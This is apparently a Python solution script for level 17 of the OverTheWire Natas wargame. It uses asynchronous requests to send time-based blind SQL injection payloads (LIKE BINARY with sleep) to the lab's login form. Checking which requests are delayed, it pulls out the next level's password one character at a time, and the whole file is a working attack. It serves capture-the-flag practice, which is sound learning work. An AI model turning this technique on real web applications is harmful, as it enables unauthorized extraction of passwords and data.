import aiohttp
import asyncio
import string
import time

from halo import Halo


URL = "http://natas17.natas.labs.overthewire.org/"
INJECTION_TIME = 8  # Time delay for blind sql injection in seconds
SPINNER_TEXT = "The password for natas 18 is: "


async def get_password_request(session, natas18_password, character):
    payload = f'natas18" AND password LIKE BINARY "{natas18_password + character}%" AND sleep({INJECTION_TIME})-- -'
    data = {"username": payload}

    start = time.time()
    async with session.post(URL, data=data) as response:
        await response.text()
        elapsed_time = time.time() - start

        return elapsed_time, character


async def get_password(session, valid_characters):
    spinner = Halo(text=SPINNER_TEXT, spinner="bouncingBar", color="blue")
    spinner.start()
    natas18_password = ""

    for _ in range(32):

        tasks = []
        for character in valid_characters:
            tasks.append(asyncio.ensure_future(get_password_request(session, natas18_password, character)))
        requests = await asyncio.gather(*tasks)

        for response in requests:
            elapsed_time = response[0]
            character_injected = response[1]
            if elapsed_time >= INJECTION_TIME:
                natas18_password += character_injected
                spinner.stop()
                spinner = Halo(text=SPINNER_TEXT + natas18_password,
                               spinner="bouncingBar", color="blue")
                spinner.start()

    spinner.succeed(text=SPINNER_TEXT + natas18_password)

    return natas18_password


async def get_valid_chars_request(session, character):
    payload = f'natas18" AND password LIKE BINARY "%{character}%" AND sleep({INJECTION_TIME})-- -'
    data = {"username": payload}

    start = time.time()
    async with session.post(URL, data=data) as response:
        await response.text()
        elapsed_time = time.time() - start

        return elapsed_time, character


async def get_valid_chars(session):
    spinner = Halo(text="Getting valid characters for the injection in natas 17... ",
                   spinner="bouncingBar", color="blue")
    spinner.start()
    characters = string.digits + string.ascii_letters
    valid_characters = ""

    tasks = []
    for character in characters:
        tasks.append(asyncio.ensure_future(get_valid_chars_request(session, character)))
    requests = await asyncio.gather(*tasks)

    for response in requests:
        elapsed_time = response[0]
        character_injected = response[1]
        if elapsed_time >= INJECTION_TIME:
            valid_characters += character_injected

    spinner.stop()

    return valid_characters


async def make_session(natas17_password):
    """
    Create a session and start running an asynchronous function
    that exploits the SQLinjection in natas 17.
    """
    auth = aiohttp.BasicAuth("natas17", natas17_password)
    async with aiohttp.ClientSession(auth=auth) as session:
        valid_characters = await get_valid_chars(session)
        natas18_password = await get_password(session, valid_characters)

    return natas18_password


def get_natas18_password(natas17_password):
    """
    Create an event loop and run an asynchronous function.
    """
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    natas18_password = asyncio.run(make_session(natas17_password))

    return natas18_password


if __name__ == "__main__":
    natas17_password = ""  # Put here the password for natas16 here
    get_natas18_password(natas17_password)
